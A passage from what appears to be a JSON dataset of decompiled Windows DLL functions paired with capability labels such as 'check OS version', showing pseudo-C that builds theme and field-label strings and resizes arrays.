fcn.18002f0b0(&uStack528, puVar15, puVar10 + iStack320);\n                        puVar1 = iVar24 + 0x40;\n                        if (puVar1 != &uStack528) {\n                            fcn.18002e090(puVar1);\n                            *puVar1 = uStack528;\n                            uStack528 = 0;\n                        }\n                        fcn.18002e090(&uStack528);\n                        if ((uStack496 != NULL) && (puVar8 = (**(*uStack496 + 0x10))(),  puVar8 != NULL)) {\n                            (***puVar8)(puVar8, 1);\n                        }\n                        if (0xf < uStack312) {\n                            iVar21 = auStack336;\n                            if (uStack312 + 1 < 0x1000) {\ncode_r0x000180059a63:\n                                fcn.18008fb24(iVar21);\n                                goto code_r0x000180059a68;\n                            }\n                            iVar21 = *(auStack336 + -8);\n                            if ((auStack336 - iVar21) - 8U < 0x20) goto code_r0x000180059a63;\n                            fcn.1800b3528(iVar21, uStack312 + 0x28);\ncode_r0x00018005ab22:\n                            fcn.1800b3528();\ncode_r0x00018005ab28:\n                            fcn.1800b3528();\ncode_r0x00018005ab2e:\n                            fcn.1800b3528();\ncode_r0x00018005ab34:\n                            fcn.1800b3528();\ncode_r0x00018005ab3a:\n                            fcn.1800b3528();\ncode_r0x00018005ab40:\n                            fcn.1800b3528();\ncode_r0x00018005ab46:\n                            fcn.1800b3528();\ncode_r0x00018005ab4c:\n                            fcn.1800b3528();\ncode_r0x00018005ab52:\n                            fcn.1800b3528();\ncode_r0x00018005ab58:\n                            fcn.1800b3528();\n                            pcVar3 = swi(3);\n                            (*pcVar3)();\n                            return;\n                        }\ncode_r0x000180059a68:\n                        puStack480 = &uStack528;\n                        uStack512 = 0;\n                        uStack504 = 0xf;\n                        uStack528 = uStack528 & 0xffffffffffffff00;\n                        fcn.180011120(&uStack528, 0x1800f4973, 0);\n                        uStack288 = 0;\n                        uStack280 = 0xf;\n                        uStack304._0_1_ = 0;\n                        fcn.180011120(&uStack304, 0x1800f49b7, 0);\n                        iStack320 = 0;\n                        uStack312 = 0xf;\n                        _auStack336 = _auStack336 & 0xffffffffffffff00;\n                        uStack536 = uVar26 & 0xfffffff8 | 8;\n                        if (0xf < puVar25[2] + 6) {\n                            fcn.1800137f0(auStack336, puVar25[2] + 6);\n                        }\n                        iStack320 = 0;\n                        fcn.18000dc30(auStack336, puVar25);\n                        if (uStack312 - iStack320 < 6) {\n                            puStack568 = 0x6;\n                            puVar10 = auStack336;\n                            fcn.180014270(puVar10, 6, 0, \"_Theme\");\n                        }\n                        else {\n                            auStack336 = auStack336;\n                            if (0xf < uStack312) {\n                            }\n                            auStack336 = auStack336 + iStack320;\n                            puVar10 = auStack336;\n                            iStack320 = iStack320 + 6;\n                            fcn.1800ade80(auStack336, \"_Theme\", 6);\n                            auStack336[6] = 0;\n                        }\n                        puStack560 = &uStack528;\n                        puStack568 = &uStack304;\n                        uVar7 = fcn.180004f50(puVar10, &uStack472, &uStack152, auStack336);\n                        fcn.18000d960(iVar24 + 0x68, uVar7);\n                        if (7 < uStack448) {\n                            iVar19 = CONCAT62(uStack472._2_6_, CONCAT11(uStack472._1_1_, uStack472));\n                            iVar21 = iVar19;\n                            if ((0xfff < uStack448 * 2 + 2) && (iVar21 = *(iVar19 + -8),  0x1f < (iVar19 - iVar21) - 8U)\n                               ) goto code_r0x00018005ab22;\n                            fcn.18008fb24(iVar21);\n                        }\n                        uStack456 = 0;\n                        uStack448 = 7;\n                        uStack472._0_1_ = 0;\n                        uStack472._1_1_ = 0;\n                        if (0xf < uStack312) {\n                            iVar21 = auStack336;\n                            if ((0xfff < uStack312 + 1) &&\n                               (iVar21 = *(auStack336 + -8),  0x1f < (auStack336 - iVar21) - 8U))\n                            goto code_r0x00018005ab28;\n                            fcn.18008fb24(iVar21);\n                        }\n                        iStack320 = 0;\n                        uStack312 = 0xf;\n                        _auStack336 = _auStack336 & 0xffffffffffffff00;\n                        if (0xf < uStack280) {\n                            iVar19 = CONCAT62(uStack304._2_6_, CONCAT11(uStack304._1_1_, uStack304));\n                            iVar21 = iVar19;\n                            if ((0xfff < uStack280 + 1) && (iVar21 = *(iVar19 + -8),  0x1f < (iVar19 - iVar21) - 8U))\n                            goto code_r0x00018005ab2e;\n                            fcn.18008fb24(iVar21);\n                        }\n                        uStack192 = 0;\n                        uStack184 = 0xf;\n                        uStack208 = uStack208 & 0xffffff00;\n                        puStack480 = &uStack528;\n                        uStack512 = 0;\n                        uStack504 = 0xf;\n                        uStack528 = uStack528 & 0xffffffffffffff00;\n                        fcn.180011120(&uStack528, 0x1800f49e7, 0);\n                        uStack288 = 0;\n                        uStack280 = 0xf;\n                        uStack304._0_1_ = 0;\n                        fcn.180011120(&uStack304, 0x1800f49e6, 0);\n                        iStack320 = 0;\n                        uStack312 = 0xf;\n                        _auStack336 = _auStack336 & 0xffffffffffffff00;\n                        uStack536 = uVar26 & 0xfffffff0 | 0x10;\n                        if (0xf < puVar25[2] + 0xc) {\n                            fcn.1800137f0(auStack336, puVar25[2] + 0xc);\n                        }\n                        iStack320 = 0;\n                        fcn.18000dc30(auStack336, puVar25);\n                        if (uStack312 - iStack320 < 0xc) {\n                            puStack568 = 0xc;\n                            puVar10 = auStack336;\n                            fcn.180014270(puVar10, 0xc, 0, \"_FieldWidths\");\n                        }\n                        else {\n                            auStack336 = auStack336;\n                            if (0xf < uStack312) {\n                            }\n                            auStack336 = auStack336 + iStack320;\n                            puVar10 = auStack336;\n                            iStack320 = iStack320 + 0xc;\n                            fcn.1800ade80(auStack336, \"_FieldWidths\", 0xc);\n                            auStack336[0xc] = 0;\n                        }\n                        puStack560 = &uStack528;\n                        puStack568 = &uStack304;\n                        puVar8 = fcn.180004b90(puVar10, &uStack472, &uStack152, auStack336);\n                        if (&uStack208 != puVar8) {\n                            if (0xf < uStack184) {\n                                iVar19 = CONCAT44(uStack204, uStack208);\n                                iVar21 = iVar19;\n                                if ((0xfff < uStack184 + 1) && (iVar21 = *(iVar19 + -8),  0x1f < (iVar19 - iVar21) - 8U)\n                                   ) goto code_r0x00018005ab34;\n                                fcn.18008fb24(iVar21);\n                            }\n                            uStack208 = *puVar8;\n                            uStack204 = *(puVar8 + 4);\n                            uStack200 = *(puVar8 + 1);\n                            uStack196 = *(puVar8 + 0xc);\n                            uStack192 = puVar8[2];\n                            uStack184 = puVar8[3];\n                            puVar8[2] = 0;\n                            puVar8[3] = 0xf;\n                            *puVar8 = 0;\n                        }\n                        if (0xf < uStack448) {\n                            iVar19 = CONCAT62(uStack472._2_6_, CONCAT11(uStack472._1_1_, uStack472));\n                            iVar21 = iVar19;\n                            if ((0xfff < uStack448 + 1) && (iVar21 = *(iVar19 + -8),  0x1f < (iVar19 - iVar21) - 8U))\n                            goto code_r0x00018005ab34;\n                            fcn.18008fb24(iVar21);\n                        }\n                        uStack456 = 0;\n                        uStack448 = 0xf;\n                        uStack472._0_1_ = 0;\n                        if (0xf < uStack312) {\n                            iVar21 = auStack336;\n                            if ((0xfff < uStack312 + 1) &&\n                               (iVar21 = *(auStack336 + -8),  0x1f < (auStack336 - iVar21) - 8U))\n                            goto code_r0x00018005ab3a;\n                            fcn.18008fb24(iVar21);\n                        }\n                        iStack320 = 0;\n                        uStack312 = 0xf;\n                        _auStack336 = _auStack336 & 0xffffffffffffff00;\n                        if (0xf < uStack280) {\n                            iVar19 = CONCAT62(uStack304._2_6_, CONCAT11(uStack304._1_1_, uStack304));\n                            iVar21 = iVar19;\n                            if ((0xfff < uStack280 + 1) && (iVar21 = *(iVar19 + -8),  0x1f < (iVar19 - iVar21) - 8U))\n                            goto code_r0x00018005ab40;\n                            fcn.18008fb24(iVar21);\n                        }\n                        uStack288 = 0;\n                        uStack280 = 0xf;\n                        uStack304._0_1_ = 0;\n                        puVar10 = &uStack304;\n                        fcn.180011120(puVar10, 0x1800f8464, 1);\n                        iVar6 = fcn.18000a590(puVar10, &uStack208, iVar24 + 0xa0);\n                        uVar14 = iVar6;\n                        if (0xf < uStack280) {\n                            iVar19 = CONCAT62(uStack304._2_6_, CONCAT11(uStack304._1_1_, uStack304));\n                            iVar21 = iVar19;\n                            if (uStack280 + 1 < 0x1000) {\ncode_r0x000180059f8d:\n                                fcn.18008fb24(iVar21);\n                                goto code_r0x000180059f92;\n                            }\n                            iVar16 = uStack280 + 0x28;\n                            iVar21 = *(iVar19 + -8);\n                            if ((iVar19 - iVar21) - 8U < 0x20) goto code_r0x000180059f8d;\ncode_r0x00018005aaec:\n                            fcn.1800b3528(iVar21, iVar16);\n                            goto code_r0x00018005aaf2;\n                        }\ncode_r0x000180059f92:\n                        piVar20 = iVar24 + 0x88;\n                        iVar21 = *piVar20;\n                        *(iVar24 + 0x90) = iVar21;\n                        iVar19 = *piVar20;\n                        uVar23 = iVar21 - iVar19 >> 2;\n                        if (uVar14 < uVar23) {\n                            *(iVar24 + 0x90) = iVar19 + uVar14 * 4;\n                        }\n                        else if (uVar23 < uVar14) {\n                            if (*(iVar24 + 0x98) - iVar19 >> 2 < uVar14) {\n                                fcn.180064950(piVar20, uVar14);\n                            }\n                            else {\n                                iVar19 = (uVar14 - uVar23) * 4;\n                                fcn.1800ae290(iVar21, 0, iVar19);\n                                *(iVar24 + 0x90) = iVar21 + iVar19;\n                            }\n                        }\n                        uVar11 = 0;\n                        uVar23 = uVar11;\n                        if (0 < uVar14) {\n                            do {\n                                *(*piVar20 + uVar11 * 4) = uVar23;\n                                iVar21 = uVar11 * 4;\n                                uVar11 = uVar11 + 1;\n                                uVar23 = uVar23 + *(*(iVar24 + 0xa0) + iVar21);\n                            } while (uVar11 < uVar14);\n                        }\n                        uStack256 = 0;\n                        uStack248 = 7;\n                        uStack272._0_1_ = 0;\n                        uStack272._1_1_ = 0;\n                        uStack224 = 0;\n                        uStack216 = 7;\n                        uStack240 = 0;\n                        puStack480 = &uStack528;\n                        uStack512 = 0;\n                        uStack504 = 0xf;\n                        uStack528 = uStack528 & 0xffffffffffffff00;\n                        fcn.180011120(&uStack528, 0x1800f4a07, 0);\n                        uStack288 = 0;\n                        uStack280 = 0xf;\n                        uStack304._0_1_ = 0;\n                        fcn.180011120(&uStack304, 0x1800f4a06, 0);\n                        iStack320 = 0;\n                        uStack312 = 0xf;\n                        _auStack336 = _auStack336 & 0xffffffffffffff00;\n                        uStack536 = uVar26 & 0xffffffe0 | 0x20;\n                        if (0xf < puVar25[2] + 0xc) {\n                            fcn.1800137f0(auStack336, puVar25[2] + 0xc);\n                        }\n                        iStack320 = 0;\n                        fcn.18000dc30(auStack336, puVar25);\n                        if (uStack312 - iStack320 < 0xc) {\n                            puStack568 = 0xc;\n                            puVar10 = auStack336;\n                            fcn.180014270(puVar10, 0xc, 0, \"_FieldLabels\");\n                        }\n                        else {\n                            auStack336 = auStack336;\n                            if (0xf < uStack312) {\n                            }\n                            auStack336 = auStack336 + iStack320;\n                            puVar10 = auStack336;\n                            iStack320 = iStack320 + 0xc;\n                            fcn.1800ade80(auStack336, \"_FieldLabels\", 0xc);\n                            auStack336[0xc] = 0;\n                        }\n                        puStack560 = &uStack528;\n                        puStack568 = &uStack304;\n                        puVar9 = fcn.180004f50(puVar10, &uStack472, &uStack152, auStack336);\n                        if (&uStack272 != puVar9) {\n                            if (7 < uStack248) {\n                                iVar19 = CONCAT44(uStack272._4_4_, \n                                                  CONCAT22(uStack272._2_2_, CONCAT11(uStack272._1_1_, uStack272)));\n                                iVar21 = iVar19;\n                                if ((0xfff < uStack248 * 2 + 2) &&\n                                   (iVar21 = *(iVar19 + -8),  0x1f < (iVar19 - iVar21) - 8U)) goto code_r0x00018005ab46;\n                                fcn.18008fb24(iVar21);\n                            }\n                            uVar4 = *puVar9;\n                            uStack272._4_4_ = puVar9[1];\n                            uStack264 = puVar9[2];\n                            uStack260 = puVar9[3];\n                            uStack272._0_1_ = uVar4;\n                            uStack272._1_1_ = uVar4 >> 8;\n                            uStack272._2_2_ = uVar4 >> 0x10;\n                            uStack256 = *(puVar9 + 4);\n                            uStack248 = *(puVar9 + 6);\n                            *(puVar9 + 4) = 0;\n                            *(puVar9 + 6) = 7;\n                            *puVar9 = 0;\n                        }\n                        if (7 < uStack448) {\n                            iVar19 = CONCAT62(uStack472._2_6_, CONCAT11(uStack472._1_1_, uStack472));\n                            iVar21 = iVar19;\n                            if ((0xfff < uStack448 * 2 + 2) && (iVar21 = *(iVar19 + -8),  0x1f < (iVar19 - iVar21) - 8U)\n                               ) goto code_r0x00018005ab46;\n                            fcn.18008fb24(iVar21);\n                        }\n                        uStack456 = 0;\n                        uStack448 = 7;\n                        uStack472._0_1_ = 0;\n                        uStack472._1_1_ = 0;\n                        uVar14 = piStack488 & 0xffffffc0;\n                        if (0xf < uStack312) {\n                            iVar21 = auStack336;\n                            if ((0xfff < uStack312 + 1) &&\n                               (iVar21 = *(auStack336 + -8),  0x1f < (auStack336 - iVar21) - 8U))\n                            goto code_r0x00018005ab4c;\n                            fcn.18008fb24(iVar21);\n                        }\n                        iStack320 = 0;\n                        uStack312 = 0xf;\n                        _auStack336 = _auStack336 & 0xffffffffffffff00;\n                        if (0xf < uStack280) {\n                            iVar19 = CONCAT62(uStack304._2_6_, CONCAT11(uStack304._1_1_, uStack304));\n                            iVar21 = iVar19;\n                            if ((0xfff < uStack280 + 1) && (iVar21 = *(iVar19 + -8),  0x1f < (iVar19 - iVar21) - 8U))\n                            goto code_r0x00018005ab52;\n                            fcn.18008fb24(iVar21);\n                        }\n                        uStack288 = 0;\n                        uStack280 = 7;\n                        uStack304._0_1_ = 0;\n                        uStack304._1_1_ = 0;\n                        puVar10 = &uStack304;\n                        fcn.180010d70(puVar10, 0x1800f8484, 1);\n                        piVar20 = iVar24 + 0xb8;\n                        piStack488 = piVar20;\n                        iVar6 = fcn.18000a330(puVar10, &uStack272, piVar20, &uStack304);\n                        puVar25 = iVar6;\n                        if (7 < uStack280) {\n                            iVar19 = CONCAT62(uStack304._2_6_, CONCAT11(uStack304._1_1_, uStack304));\n                            iVar21 = iVar19;\n                            if ((0xfff < uStack280 * 2 + 2) && (iVar21 = *(iVar19 + -8),  0x1f < (iVar19 - iVar21) - 8U)\n                               ) {\ncode_r0x00018005ab6a:\n                                fcn.1800b3528();\n                                pcVar3 = swi(3);\n                                (*pcVar3)();\n                                return;\n                            }\n                            fcn.18008fb24(iVar21);\n                        }\n                        arg1_01 = iVar24 + 0xd0;\n                        iVar21 = *arg1_01;\n                        *(iVar24 + 0xd8) = iVar21;\n                        iVar19 = *arg1_01;\n                        puVar8 = iVar21 - iVar19 >> 2;\n                        puStack480 = puVar25;\n                        if (puVar25 < puVar8) {\n                            *(iVar24 + 0xd8) = iVar19 + puVar25 * 4;\n                        }\n                        else if (puVar8 < puVar25) {\n                            if (*(iVar24 + 0xe0) - iVar19 >> 2 < puVar25) {\n                                fcn.180064950(arg1_01, puVar25);\n                            }\n                            else {\n                                iVar19 = (puVar25 - puVar8) * 4;\n                                fcn.1800ae290(iVar21, 0, iVar19);\n                                *(iVar24 + 0xd8) = iVar21 + iVar19;\n                            }\n                        }\n                        iStack432 = 0;\n                        if (0 < puStack480) {\n                            iStack408 = 0;\n                            do {\n                                iVar24 = iStack432;\n                                puVar22 = NULL;\n                                puVar8 = *piVar20 + iStack408;\n                                *(*arg1_01 + iStack432 * 4) = 0xffffffff;\n                                uVar23 = puVar8[2];\n                                puVar25 = puVar8;\n                                if (7 < puVar8[3]) {\n                                    puVar25 = *puVar8;\n                                }\n                                if (uVar23 == 0) {\ncode_r0x00018005a449:\n                                    iVar21 = -1;\n                                }\n                                else {\n                                    iVar2 = *puVar25;\n                                    puVar12 = puVar25;\n                                    for (uVar11 = uVar23;\n                                        (puVar17 = puVar12,  iVar2 != 0x3a && (puVar17 = puVar22,  uVar11 != 1));\n                                        uVar11 = uVar11 - 1) {\n                                        puVar12 = puVar12 + 2;\n                                        iVar2 = *puVar12;\n                                    }\n                                    if (puVar17 == NULL) goto code_r0x00018005a449;\n                                    iVar21 = puVar17 - puVar25 >> 1;\n                                }\n                                if (iVar21 != -1) {\n                                    uVar11 = iVar21 + 1;\n                                    uStack512 = 0;\n                                    uStack504 = 7;\n                                    uStack528 = uStack528 & 0xffffffffffff0000;\n                                    if (uVar23 < uVar11) {\n                                        fcn.180011cd0();\n                                        goto code_r0x00018005ab76;\n                                    }\n                                    iVar21 = -1;\n                                    if (uVar23 - uVar11 != -1) {\n                                        iVar21 = uVar23 - uVar11;\n                                    }\n                                    if (7 < puVar8[3]) {\n                                        puVar8 = *puVar8;\n                                    }\n                                    fcn.180010d70(&uStack528, puVar8 + uVar11 * 2, iVar21);\n                                    if (7 < uStack216) {\n                                        iVar19 = CONCAT44(uStack236, CONCAT22(uStack238, uStack240));\n                                        iVar21 = iVar19;\n                                        if ((0xfff < uStack216 * 2 + 2) &&\n                                           (iVar21 = *(iVar19 + -8),  0x1f < (iVar19 - iVar21) - 8U))\n                                        goto code_r0x00018005ab6a;\n                                        fcn.18008fb24(iVar21);\n                                    }\n                                    uStack240 = uStack528;\n                                    uStack238 = uStack528 >> 0x10;\n                                    uStack236 = uStack528._4_4_;\n                                    uStack232 = uStack520;\n                                    uStack228 = uStack520._4_4_;\n                                    uStack224 = uStack512;\n                                    uStack216 = uStack504;\n                                    uStack512 = 0;\n                                    uStack504 = 7;\n                                    uStack528 = uStack528 & 0xffffffffffff0000;\n                                    uVar26 = uVar14 | 0xc0;\n                                    iStack320 = 0;\n                                    uStack312 = 7;\n                                    _auStack336 = _auStack336 & 0xffffffffffff0000;\n                                    uStack536 = uVar26;\n                                    fcn.180010d70(auStack336, 0x1800f8534, 0);\n                                    puVar18 = &uStack240;\n                                    if (7 < uStack216) {\n                                        puVar18 = CONCAT44(uStack236, CONCAT22(uStack238, uStack240));\n                                    }\n                                    arg3_00 = &uStack240;\n                                    if (7 < uStack216) {\n                                        arg3_00 = CONCAT44(uStack236, CONCAT22(uStack238, uStack240));\n                                    }\n                                    puStack560 = auStack336;\n                                    puStack568 = var_bp_58h;\n                                    puVar10 = auStack352;\n                                    fcn.180015730(puVar10, &uStack528, arg3_00, puVar18 + uStack224);\n                                    if (7 < uStack312) {\n                                        puVar10 = auStack336;\n                                        if ((0xfff < uStack312 * 2 + 2) &&\n                                           (puVar10 = *(auStack336 + -8),  0x1f < auStack336 + (-8 - puVar10)))\n                                        goto code_r0x00018005ab58;\n                                        fcn.18008fb24(puVar10);\n                                    }\n                                    if (7 < uStack216) {\n                                        puVar15 = CONCAT44(uStack236, CONCAT22(uStack238, uStack240));\n                                        puVar10 = puVar15;\n                                        if (uStack216 * 2 + 2 < 0x1000) {\ncode_r0x00018005a5f9:\n                                            fcn.18008fb24(puVar10);\n                                            goto code_r0x00018005a5fe;\n                                        }\n                                        puVar10 = *(puVar15 + -8);\n                                        if (puVar15 + (-8 - puVar10) < 0x20) goto code_r0x00018005a5f9;\n                                        fcn.1800b3528(puVar10, uStack216 * 2 + 0x29);\ncode_r0x00018005ab64:\n                                        fcn.1800b3528();\n                                        goto code_r0x00018005ab6a;\n                                    }\ncode_r0x00018005a5fe:\n                                    uStack240 = uStack528;\n                                    uStack238 = uStack528 >> 0x10;\n                                    uStack236 = uStack528._4_4_;\n                                    uStack232 = uStack520;\n                                    uStack228 = uStack520._4_4_;\n                                    uStack224 = uStack512;\n                                    uStack216 = uStack504;\n                                    uStack536 = uVar26 & 0xffffff7f;\n                                    uVar14 = uStack536;\n                                    fcn.180005e50(puVar10, &uStack304, &uStack240);\n                                    uVar23 = uStack280;\n                                    if (uStack288 == 0x10) {\n                                        puVar13 = auStack176._8_8_ - auStack176._0_8_;\n                                        iVar24 = puVar13 >> 0x3f;\n                                        iVar21 = puVar13 / 0x28 + iVar24;\n                                        puVar1 = CONCAT62(uStack304._2_6_, CONCAT11(uStack304._1_1_, uStack304));\n                                        auVar27 = extraout_XMM0_01;\n                                        if (iVar21 != iVar24) {\n                                            puVar25 = auStack176._0_8_ + 8;\n                                            do {\n                                                puVar8 = puVar25;\n                                                if (0xf < puVar25[3]) {\n                                                    puVar8 = *puVar25;\n                                                }\n                                                puVar13 = &uStack304;\n                                                if (0xf < uVar23) {\n                                                    puVar13 = puVar1;\n                                                }\n                                                if ((puVar25[2] == 0x10) &&\n                                                   (iVar6 = fcn.1800ae4d0(puVar13, puVar8, 0x10), \n                                                   auVar27 = extraout_XMM0_02,  iVar6 == 0)) {\n                                                    *(*arg1_01 + iStack432 * 4) = *(auStack176._0_8_ + puVar22 * 0x28);\n                                                    goto code_r0x00018005a7d2;\n                                                }\n                                                puVar22 = puVar22 + 1;\n                                                puVar25 = puVar25 + 5;\n                                            } while (puVar22 < iVar21 - iVar24);\n                                        }\n                                        uVar26 = uStack440;\n                                        iVar24 = uStack440;\n                                        if (uStack440 < 0x4c) {\ncode_r0x00018005a7d2:\n                                            if (0xf < uVar23) {\n                                                puVar13 = puVar1;\n                                                if ((uVar23 + 1 < 0x1000) ||\n                                                   (puVar13 = puVar1[-1],  puVar1 + (-8 - puVar1[-1]) < 0x20))\n                                                goto code_r0x00018005a952;\n                                                goto code_r0x00018005ab6a;\n                                            }\n                                        }\n                                        else {\n                                            _auStack336 = auVar27 & 0x0;\n                                            fcn.180006040(puVar13, &uStack304, auStack336);\n                                            pcVar3 = pcStack384;\n                                            uVar7 = uStack392;\n                                            (*pcStack384)(uStack392, 0x804, iVar24, auStack336._0_4_);\n                                            (*pcVar3)(uVar7, 0x803, iVar24, auStack336._4_4_);\n                                            (*pcVar3)(uVar7, 0x805, iVar24, iStack328);\n                                            (*pcVar3)(uVar7, 0x806, iVar24, iStack324);\n                                            uVar23 = uStack280;\n                                            uVar14 = uStack288;\n                                            *(*arg1_01 + iStack432 * 4) = uVar26;\n                                            uStack528 = uStack528 & 0xffffffff00000000 | uVar26;\n                                            uVar11 = 0;\n                                            uStack504 = 0;\n                                            uStack496 = NULL;\n                                            puVar1 = CONCAT62(uStack304._2_6_, CONCAT11(uStack304._1_1_, uStack304));\n                                            puVar13 = &uStack304;\n                                            if (0xf < uStack280) {\n                                                puVar13 = puVar1;\n                                            }\n                                            if (uStack288 < 0x10) {\n                                                uStack520._0_4_ = *puVar13;\n                                                uStack520._4_4_ = *(puVar13 + 4);\n                                                uStack520 = *puVar13;\n                                                uStack512._0_4_ = *(puVar13 + 1);\n                                                uStack512._4_4_ = *(puVar13 + 0xc);\n                                                uStack512 = puVar13[1];\n                                                uStack496 = 0xf;\n                                            }\n                                            else {\n                                                piVar20 = uStack288 | 0xf;\n                                                if (0x7fffffffffffffff < piVar20) {\n                                                    piVar20 = 0x7fffffffffffffff;\n                                                }\n                                                arg1_00 = piVar20 + 1;\n                                                if (arg1_00 < 0x1000) {\n                                                    if (arg1_00 != NULL) {\n                                                        uVar11 = fcn.18008fb2c(arg1_00);\n                                                    }\n                                                }\n                                                else {\n                                                    arg1_02 = piVar20 + 5;\n                                                    if (arg1_02 <= arg1_00) {\n                                                        arg1_02 = 0xffffffffffffffff;\n                                                    }\n                                                    iVar24 = fcn.18008fb2c(arg1_02);\n                                                    if (iVar24 == 0) goto code_r0x00018005ab64;\n                                                    uVar11 = iVar24 + 0x27U & 0xffffffffffffffe0;\n                                                    *(uVar11 - 8) = iVar24;\n                                                }\n                                                uStack520 = uVar11;\n                                                fcn.1800ade80(uVar11, puVar13, uVar14 + 1);\n                                                uStack496 = piVar20;\n                                            }\n                                            uStack504 = uVar14;\n                                            if (auStack176._8_8_ == puStack160) {\n                                                fcn.1800635c0(auStack176, auStack176._8_8_, &uStack528);\n                                                piVar20 = uStack496;\n                                            }\n                                            else {\n                                                *auStack176._8_8_ = uVar26;\n                                                auStack176._8_8_[2] = uStack520;\n                                                auStack176._8_8_[3] = uStack520._4_4_;\n                                                auStack176._8_8_[4] = uStack512;\n                                                auStack176._8_8_[5] = uStack512._4_4_;\n                                                uStack504._0_4_ = uVar14;\n                                                uStack504._4_4_ = uVar14 >> 0x20;\n                                                auStack176._8_8_[6] = uStack504;\n                                                auStack176._8_8_[7] = uStack504._4_4_;\n                                                auStack176._8_8_[8] = uStack496;\n                                                auStack176._8_8_[9] = uStack496._4_4_;\n                                                uStack520 = uStack520 & 0xffffffffffffff00;\n                                                auStack176 = CONCAT88(auStack176._8_8_ + 10, auStack176._0_8_);\n                                                piVar20 = 0xf;\n                                            }\n                                            if (0xf < piVar20) {\n                                                uVar14 = uStack520;\n                                                if ((0xfff < piVar20 + 1U) &&\n                                                   (uVar14 = *(uStack520 - 8),  0x1f < (uStack520 - uVar14) - 8))\n                                                goto code_r0x00018005ab64;\n                                                fcn.18008fb24(uVar14);\n                                            }\n                                            uStack440 = uVar26 - 1;\n                                            if (0xf < uVar23) {\n                                                puVar13 = puVar1;\n                                                if ((0xfff < uVar23 + 1) &&\n                                                   (puVar13 = puVar1[-1],  0x1f < puVar1 + (-8 - puVar13)))\n                                                goto code_r0x00018005ab6a;\ncode_r0x00018005a952:\n                                                fcn.18008fb24(puVar13);\n                                            }\n                                        }\n                                        uVar14 = uStack536;\n                                        piVar20 = piStack488;\n                                    }\n                                    else {\n                                        *(*arg1_01 + iVar24 * 4) = 0x20;\n                                        if (0xf < uStack280) {\n                                            iVar21 = CONCAT62(uStack304._2_6_, CONCAT11(uStack304._1_1_, uStack304));\n                                            iVar24 = iVar21;\n                                            if ((0xfff < uStack280 + 1) &&\n                                               (iVar24 = *(iVar21 + -8),  0x1f < (iVar21 - iVar24) - 8U))\n                                            goto code_r0x00018005ab6a;\n                                            fcn.18008fb24(iVar24);\n                                        }\n                                    }\n                                }\n                                iStack432 = iStack432 + 1;\n                                iStack408 = iStack408 + 0x20;\n                            } while (iStack432 < puStack480);\n                        }\n                        if (7 < uStack216) {\n                            iVar21 = CONCAT44(uStack236, CONCAT22(uStack238, uStack240));\n                            iVar24 = iVar21;\n                            if ((0xfff < uStack216 * 2 + 2) && (iVar24 = *(iVar21 + -8),  0x1f < (iVar21 - iVar24) - 8U)\n                               ) {\ncode_r0x00018005ab76:\n                                fcn.1800b3528();\n                                pcVar3 = swi(3);\n                                (*pcVar3)();\n                                return;\n                            }\n                            fcn.18008fb24(iVar24);\n                        }\n                        uStack224 = 0;\n                        uStack216 = 7;\n                        uStack240 = 0;\n                        if (7 < uStack248) {\n                            iVar24 = CONCAT44(uStack272._4_4_, \n                                              CONCAT22(uStack272._2_2_, CONCAT11(uStack272._1_1_, uStack272)));\n                            iVar21 = iVar24;\n                            if (0xfff < uStack248 * 2 + 2) {\n                                iVar16 = uStack248 * 2 + 0x29;\n                                iVar21 = *(iVar24 + -8);\n                                if (0x1f < (iVar24 - iVar21) - 8U) goto code_r0x00018005aaec;\n                            }\n                            fcn.18008fb24(iVar21);\n                        }\n                        uStack256 = 0;\n                        uStack248 = 7;\n                        uStack272._0_1_ = 0;\n                        uStack272._1_1_ = 0;\n                        fcn.18000dd00(&uStack208);\n                        iStack436 = iStack436 + 1;\n                        puStack416 = puStack416 + 1;\n                        piVar20 = piStack400;\n                    } while (puStack416 < iStack424);\n                }\n                fcn.18000dcd0(piStack376, &uStack152);\n                *(piStack368 + 0xc4) = 0;\n                fcn.18000d390(&var_bp_70h);\n                fcn.180062ea0(auStack176);\n                fcn.18000d400(var_bp_58h);\n            }\n        }\n        fcn.18000dd00(&uStack152);\n    }\ncode_r0x00018005aabc:\n    fcn.18008fb00(var_30h ^ auStack600);\n    return;\n}\n",
        "token_count": 13663
    },
    "18005ed2": {
        "rules": [
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_28h_2\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_20h_2\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_bp_30h\n\nvoid fcn.18005ed20(ulong arg1, ulong arg2, uint64_t ****arg3)\n\n{\n    uint64_t uVar1;\n    ushort *puVar2;\n    uint64_t *puVar3;\n    code *pcVar4;\n    bool bVar5;\n    ulong arg1_00;\n    char cVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint32_t uVar9;\n    uint64_t ***pppuVar10;\n    uint64_t ****ppppuVar11;\n    uint32_t *puVar12;\n    uint8_t *puVar13;\n    ulong ****ppppuVar14;\n    int64_t iVar15;\n    ulong *puVar16;\n    ulong uVar17;\n    int32_t iVar18;\n    uint8_t *puVar19;\n    uint64_t ****arg1_01;\n    char *pcVar20;\n    ulong ****arg2_00;\n    uint64_t uVar21;\n    int64_t iVar22;\n    uchar *arg2_01;\n    uint64_t **arg2_02;\n    int64_t iVar23;\n    char in_R9B;\n    uint32_t uVar24;\n    uchar extraout_XMM0 [16];\n    ulong var_8h;\n    ulong var_10h;\n    ulong var_20h;\n    ulong var_28h_2;\n    ulong var_40h_2;\n    ulong var_bp_48h;\n    ulong var_bp_50h;\n    ulong var_60h_2;\n    ulong var_bp_68h;\n    ulong var_70h;\n    ulong var_bp_78h;\n    ulong var_80h_2;\n    ulong var_88h;\n    ulong var_98h;\n    ulong var_a0h;\n    ulong var_a8h;\n    ulong var_b0h;\n    uchar auStack504 [32];\n    ulong *puStack472;\n    ulong *puStack464;\n    char cStack456;\n    ulong uStack448;\n    uint32_t uStack440;\n    uint32_t uStack436;\n    ulong uStack432;\n    uint64_t uStack424;\n    uchar uStack416;\n    unkbyte7 Stack415;\n    ulong uStack400;\n    uint64_t uStack392;\n    uint auStack384 [2];\n    uint64_t ****ppppuStack376;\n    ulong *puStack368;\n    uchar uStack360;\n    unkbyte7 Stack359;\n    ulong uStack344;\n    uint64_t uStack336;\n    ulong auStack328 [2];\n    ulong uStack312;\n    ulong uStack304;\n    